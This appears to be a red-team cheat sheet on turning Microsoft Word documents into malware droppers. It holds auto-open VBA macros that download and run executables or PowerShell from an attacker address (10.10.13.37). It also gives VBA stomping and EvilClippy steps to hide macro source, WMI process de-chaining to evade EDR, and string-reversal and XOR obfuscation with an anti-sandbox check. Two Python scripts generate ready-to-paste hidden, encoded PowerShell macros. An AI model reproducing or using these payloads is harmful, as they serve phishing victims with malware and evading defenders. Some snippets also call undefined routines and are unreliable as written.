# MS Office

- [https://mgeeky.tech/backdooring-office-structures-part-1-oldschool/#malware-embedded-in-vba](https://mgeeky.tech/backdooring-office-structures-part-1-oldschool/#malware-embedded-in-vba)
- [https://mgeeky.tech/payload-crumbs-in-custom-parts/](https://mgeeky.tech/payload-crumbs-in-custom-parts/)




## MS Word Document with Switcheroo Text

1. Place "encrypted" data in a Word document after the pretext (random base64): `head -c 2K < /dev/urandom > rnd && base64 rnd`.
2. Create an AutoText: *Insert > Quick Parts > AutoTexts > Save Selection as `DecryptedBody` to AutoText Gallery*.
3. Create a macro to "decrypt" the body with readable content according to the phishing legend.

{% code title="DecryptPage.vba" %}
```vba
Sub Document_Open()
  DecryptPage
End Sub

Sub AutoOpen()
  DecryptPage
End Sub

Sub DecryptPage()
  ActiveDocument.Content.Select
  Selection.Delete
  ActiveDocument.AttachedTemplate.AutoTextEntries("DecryptedBody").Insert Where:=Selection.Range, RichText:=True
End Sub
```
{% endcode %}




## VBA Stomping



### Manually

1. Create a `.doc` file with a malicious VBA macro.
2. Open it with [FlexHEX](http://www.flexhex.com/download/): *File > Open > OLE Compound File*.
3. Open *Macros > VBA > NewMacros* file.
4. Locate the `Attribute VB_Name` ASCII string (starts with `\x41\x74\x74...`) and replace all the bytes with zeros till the end of the file: *Edit > Insert Zero Block*.
5. Save the `.doc` and exit.

Now the VBA source code is wiped and execution of macro will be performed via the P-code (if the victim's MS Word is the same).

{% hint style="info" %}
After the macro is executed this way MS Word will decompile the P-code and put the VBA source code back into the `NewMacros` file, so it will reappear in the VBA editor as well.
{% endhint %}



### EvilClippy

* [https://github.com/outflanknl/EvilClippy](https://github.com/outflanknl/EvilClippy)

```
PS > .\EvilClippy.exe -s fakecode.vba macrofile.doc
```

{% code title="DownloadWaitExec.vba" %}
```vba
Sub Document_Open()
  Hello
End Sub

Sub AutoOpen()
  Hello
End Sub

Sub Hello()
  MsgBox ("Hello, World!")
End Sub
```
{% endcode %}




## VBA Macros

Wait till a malicious binary is downloaded with PowerShell and execute it:

{% code title="fakecode.vba" %}
```vba
Sub Document_Open()
  hShellcodeRunner
End Sub
Sub AutoOpen()
  hShellcodeRunner
End Sub
Sub DownloadWaitExec()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.13.37/evil.exe', 'evil.exe')"
  Shell str, vbHide
  Dim exePath As String
  exePath = ActiveDocument.Path + "\evil.exe"
  Wait (2)
  Shell exePath, vbHide
End Sub
Sub Wait(n As Long)
  Dim t As Date
  t = Now
  Do
    DoEvents
  Loop Until Now >= DateAdd("s", n, t)
End Sub
```
{% endcode %}



### De-Chain PowerShell via WMI

- [https://blog.f-secure.com/dechaining-macros-and-evading-edr/](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)

De-chain PowerShell process from MS Word parent process via WMI:

{% code title="StageWMI.vba" %}
```vba
Sub Evil
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/run.txt')"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
```
{% endcode %}

Obfuscate it using `StrReverse` ([CyberChef](https://gchq.github.io/CyberChef/) or [Code Beautify](https://codebeautify.org/reverse-string)):

{% code title="StrReverseStageWMI.vba" %}
```vba
Function Pony(flowers)
  Pony = StrReverse(flowers)
End Function

Sub Evil
  Dim strArg As String
  strArg = Pony(")'txt.nur/73.31.01.01//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(XEI c- pon- ssapyb cexe- llehsrewop")
  GetObject(Pony(":stmgmniw")).Get(Pony("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```
{% endcode %}

Obfuscate it using xor encryption and add heuristics detection check based on comparing the `.doc` name with current window name via `ActiveDocument.Name`:

{% code title="XORStageWMI.vba" %}
```vba
Function Pears(beets)
  Pears = Chr(beets Xor Asc("a"))
End Function

Function Strawberries(grapes)
  Strawberries = Left(grapes, 3)
End Function

Function Almonds(jelly)
  Almonds = Right(jelly, Len(jelly) - 3)
End Function

Function Nuts(milk)
  Do
    Oatmilk = Oatmilk + Pears(Strawberries(milk))
    milk = Almonds(milk)
  Loop While Len(milk) > 0
  Nuts = Oatmilk
End Function

Function Evil()
  If ActiveDocument.Name <> Nuts("016022004079005014002") Then
    Exit Function
  End If
  Dim Apples As String
  Dim Water As String
  Apples = "31.." _
& "33.." _
& "33.." _
& "37.."
  Water = Nuts(Apples)
  GetObject(Nuts("022008015012006012021018091")).Get(Nuts("054008015082083062049019014002004018018")).Create Water, Tea, Coffee, Napkin
End Function

Sub Document_Open()
  Evil
End Sub

Sub AutoOpen()
  Evil
End Sub
```
{% endcode %}




## Helpers

Generate a ready-to-paste malicios MS Word macro (execution is provided by VBA [Shell function](https://docs.microsoft.com/ru-ru/office/vba/language/reference/user-interface-help/shell-function)):

{% code title="gen_doc_autoopen_payload_vbshell.py" %}
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
from base64 import b64encode
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument('pwsh_file', help='PowerShell script to execute')
parser.add_argument('--chunk-size', type=int, default=200, help='length of a payload chunk line')  # if less for big payloads, Windows can error out about "too many line continuations"
args = parser.parse_args()


def gen_payload_vbshell(pwsh_file, chunk_size):
  with open(pwsh_file, 'r', encoding='utf-8') as f:
    payload = f.read()

  payload = payload.encode('utf-16le')
  payload = b64encode(payload).decode()
  payload = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
  payload = [f'"{chunk}"' for chunk in payload]
  payload = ' _\r\n& '.join(payload)

  payload = f"""\
    Sub AutoOpen()\r
      Evil\r
    End Sub\r
    \r
    Sub Document_Open()\r
      Evil\r
    End Sub\r
    \r
    Sub Evil()\r
      Text = "powershell -exec bypass -nop -nologo -w hidden -enc " _\r
    & {payload}\r
      a = Shell(Text, vbHide)\r
    End Sub\
  """.replace('\t', '')

  return payload


if __name__ == '__main__':
  print(gen_payload_vbshell(args.pwsh_file, args.chunk_size))
```
{% endcode %}

Generate a ready-to-paste malicios MS Word macro (execution is provided by [WScript.Shell](https://docs.microsoft.com/ru-ru/windows-server/administration/windows-commands/wscript)):

{% code title="gen_doc_autoopen_payload_wscript_shell.py" %}
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
from base64 import b64encode
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument('pwsh_file', help='PowerShell script to execute')
parser.add_argument('--chunk-size', type=int, default=50, help='length of a payload chunk line')
args = parser.parse_args()


def gen_payload_wscript_shell(pwsh_file, chunk_size):
  with open(pwsh_file, 'r', encoding='utf-8') as f:
    chunks = f.read()

  chunks = chunks.encode('utf-16le')
  chunks = b64encode(chunks).decode()
  chunks = [chunks[i:i+chunk_size] for i in range(0, len(chunks), chunk_size)]
  chunks = [f'"{chunk}"' for chunk in chunks]

  print('Sub AutoOpen()\r')
  print('  Evil\r')
  print('End Sub\r\n')

  print('Sub Document_Open()\r')
  print('  Evil\r')
  print('End Sub\r\n')

  print('Sub Evil()\r')
  print('  Dim Text As String\r')
  print('  Text = "powershell -exec bypass -nop -nologo -w hidden -enc "\r')

  for chunk in chunks:
    print(f'  Text = Text + {chunk}\r')

  print('  CreateObject("WScript.Shell").Run Text\r')
  print('End Sub')


if __name__ == '__main__':
  print(gen_payload_wscript_shell(args.pwsh_file, args.chunk_size))
```
{% endcode %}




## Tools

- [https://github.com/decalage2/oletools](https://github.com/decalage2/oletools)
- [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)
